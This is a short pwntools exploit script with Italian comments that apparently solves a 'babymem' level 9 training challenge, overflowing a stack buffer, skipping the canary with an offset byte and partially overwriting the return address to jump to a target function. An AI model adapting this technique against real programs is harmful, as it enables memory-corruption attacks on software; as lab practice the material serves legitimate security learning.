from pwn import *

elf = ELF('/challenge/babymem-level-9-0')

io = elf.process()

# Il valore deve essere il valore del byte "più in là" riscritto
#   i.e., distanza dal return address + 2 per i due byte da riscrivere
io.sendline(b'74')

# Questo deve essere scritto dopo il buffer, e deve essere l'offset 
#   del byte dopo la canary, i.e., primo byte del return address
i = (71).to_bytes(length=1, byteorder='little', signed=True)

# Si aggiunge l'indirizzo della funzione, sempre un po' a cazzo
payload = b'\xaa'*48 + i + b'\x84' + b'\x16'
io.sendline(payload)

io.interactive()
